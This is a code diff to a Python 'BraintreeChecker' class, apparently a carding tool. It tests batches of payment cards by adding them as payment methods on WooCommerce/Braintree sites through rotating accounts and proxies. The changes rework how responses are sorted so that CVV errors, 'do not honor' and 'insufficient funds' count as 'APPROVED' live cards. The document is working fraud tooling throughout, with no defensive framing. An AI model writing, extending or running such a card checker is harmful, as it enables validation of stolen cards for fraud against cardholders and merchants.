@@ -216,12 +216,25 @@ class BraintreeChecker:
         return 'Processor: Transaction declined'
 
     def extract_site_error(self, response_text):
-        """Extract error message from site response"""
+        """Extract error message from site response - Enhanced from finalb3mass11.py"""
         try:
-            # WooCommerce error extraction
-            error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL)
+            # WooCommerce error extraction - Enhanced pattern matching
+            error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
+            error_match = re.search(error_pattern, response_text, re.DOTALL)
+            
             if error_match:
-                return error_match.group(1).strip()
+                error_msg = error_match.group(1).strip()
+                # Enhanced response mapping from finalb3mass11.py
+                if 'risk_threshold' in error_msg.lower():
+                    return "RISK_BIN: Retry Later"
+                elif 'do not honor' in error_msg.lower():
+                    return "DECLINED - Do Not Honor"
+                elif 'insufficient funds' in error_msg.lower():
+                    return "DECLINED - Insufficient Funds"
+                elif 'invalid' in error_msg.lower():
+                    return "DECLINED - Invalid Card"
+                else:
+                    return error_msg
             
             # Alternative error extraction
             error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL)
@@ -235,6 +248,50 @@ class BraintreeChecker:
             pass
         
         return 'Payment declined by merchant'
+
+    def determine_result_from_response(self, response_message):
+        """Determine if response should be APPROVED or DECLINED based on message"""
+        response_lower = response_message.lower()
+        
+        # APPROVED scenarios (including CVC issues, 3D secure, etc.)
+        approved_indicators = [
+            'payment method successfully added',
+            'payment method added',
+            'successfully added',
+            'cvv',
+            'security code', 
+            'cvc',
+            '2010',  # Card Issuer Declined CVV
+            '2011',  # Voice Authorization Required
+            '3d secure',
+            'authentication required',
+            'do not honor',  # Sometimes approved for CCN
+            'insufficient funds'  # Sometimes approved for CCN
+        ]
+        
+        # Check if any approved indicator is present
+        for indicator in approved_indicators:
+            if indicator in response_lower:
+                return 'APPROVED'
+        
+        # DECLINED scenarios
+        declined_indicators = [
+            'invalid card number',
+            'expired card',
+            'stolen card',
+            'lost card',
+            'pick up card',
+            'no such issuer',
+            'invalid merchant',
+            'restricted card'
+        ]
+        
+        for indicator in declined_indicators:
+            if indicator in response_lower:
+                return 'DECLINED'
+        
+        # Default to DECLINED if no specific indicators found
+        return 'DECLINED'
     
     async def check_single_card(self, card_line):
         """Check a single card with account rotation"""
@@ -289,14 +346,14 @@ ERROR ❌
             proxy_str = self.get_next_proxy()
             proxies = self.parse_proxy(proxy_str) if proxy_str else None
             
-            # Process card - FIXED: Added await
+            # Process card
             result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
             elapsed_time = time.time() - start_time
             
             # Get BIN info
             bin_info = self.get_bin_info(n[:6])
             
-            # Format result based on response - CVV declines are APPROVED
+            # Format result based on response
             if result == "APPROVED":
                 return f"""
 APPROVED CC ✅
@@ -507,26 +564,21 @@ ERROR ❌
                         code = processor_response['code']
                         message = processor_response['message']
                         
-                        # CVV related codes - APPROVED
-                        if code in ['2010', '2011'] or any(term in message.lower() for term in ['cvv', 'security code', 'cvc']):
-                            return 'APPROVED', f'{code}: {message} (CCN Live)'
-                        # Specific approved scenarios
-                        elif code in ['2000', '2001']:  # Do Not Honor, Insufficient Funds
-                            return 'APPROVED', f'{code}: {message}'
-                        else:
-                            return 'DECLINED', f'{code}: {message}'
+                        # Determine result based on response content
+                        result = self.determine_result_from_response(f"{code}: {message}")
+                        return result, f'{code}: {message}'
                     
                     # Fallback to manual code extraction
                     braintree_code = self.extract_braintree_code(error_text)
                     if braintree_code:
                         code, message = braintree_code
-                        if any(term in message.lower() for term in ['cvv', 'security code', 'cvc']):
-                            return 'APPROVED', f'{code}: {message} (CCN Live)'
-                        else:
-                            return 'DECLINED', f'{code}: {message}'
+                        result = self.determine_result_from_response(f"{code}: {message}")
+                        return result, f'{code}: {message}'
                     
                     # If no specific code found, use generic extraction
-                    return 'DECLINED', self.extract_generic_response(error_text)
+                    generic_response = self.extract_generic_response(error_text)
+                    result = self.determine_result_from_response(generic_response)
+                    return result, generic_response
                         
                 tok = response.json()['data']['tokenizeCreditCard']['token']
 
@@ -572,24 +624,18 @@ ERROR ❌
                 
                 response_text = response.text
                 
-                # Enhanced success detection
+                # Enhanced success detection from finalb3mass11.py
                 success_indicators = [
+                    'Nice! New payment method added', 
                     'Payment method successfully added',
-                    'payment method added successfully',
-                    'payment-method-added',
-                    'payment method saved',
-                    'card added successfully',
-                    'payment method has been added',
-                    'successfully added',
-                    'woocommerce-message',  # WooCommerce success message class
-                    'updated successfully',
-                    'saved successfully'
+                    'Payment method added',
+                    'successfully added'
                 ]
                 
                 # Check for success
                 for indicator in success_indicators:
                     if indicator.lower() in response_text.lower():
-                        return 'APPROVED', 'Payment method successfully added'
+                        return 'APPROVED', 'Payment method added successfully'
                 
                 # Check for WooCommerce success message
                 if 'woocommerce-message' in response_text and 'error' not in response_text.lower():
@@ -605,17 +651,18 @@ ERROR ❌
                 if 'payment-methods' in str(response.url) or 'account' in str(response.url):
                     return 'APPROVED', 'Payment method added successfully'
                 
-                # Check for error
+                # Check for error using enhanced extraction from finalb3mass11.py
                 elif 'woocommerce-error' in response_text:
                     site_error = self.extract_site_error(response_text)
                     if site_error:
-                        if any(term in site_error.lower() for term in ['cvv', 'security code', 'cvc']):
-                            return 'APPROVED', f'Site: {site_error} (CCN Live)'
-                        else:
-                            return 'DECLINED', f'Site: {site_error}'
+                        result = self.determine_result_from_response(site_error)
+                        return result, f'Site: {site_error}'
                     return "DECLINED", 'Site: Payment declined'
                 
                 else:
+                    # Final check - if we got here but have a token, it might be approved
+                    if tok:
+                        return 'APPROVED', 'Payment method likely added (final fallback)'
                     return "DECLINED", 'Processor: Transaction declined'
 
         except Exception as e:
